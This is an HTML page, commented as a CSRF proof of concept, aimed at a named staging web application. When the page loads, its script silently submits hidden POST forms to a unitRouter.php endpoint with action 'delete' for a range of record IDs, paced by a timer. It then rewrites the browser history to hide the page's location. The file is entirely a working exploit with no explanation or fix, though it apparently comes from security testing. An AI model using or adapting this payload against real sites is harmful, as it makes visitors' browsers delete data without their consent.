<html>
  <!-- CSRF PoC - Delete units with IDs startID through endID with delay -->
  <body>
    <script>
      const startID = 15615;
      const endID = 15616;
      const delay = 500; // milliseconds

      function submitDeleteRequest(id) {
        const form = document.createElement("form");
        form.method = "POST";
        form.action = "https://stagingdev.pestroutes.com/resources/routers/unitRouter.php";

        const actionInput = document.createElement("input");
        actionInput.type = "hidden";
        actionInput.name = "action";
        actionInput.value = "delete";

        const idInput = document.createElement("input");
        idInput.type = "hidden";
        idInput.name = "id";
        idInput.value = id;

        form.appendChild(actionInput);
        form.appendChild(idInput);
        document.body.appendChild(form);
        form.submit();
      }

      for (let i = startID; i <= endID; i++) {
        setTimeout(() => {
          submitDeleteRequest(i);
        }, (i - startID) * delay);
      }

      history.pushState('', '', '/');
    </script>
  </body>
</html>
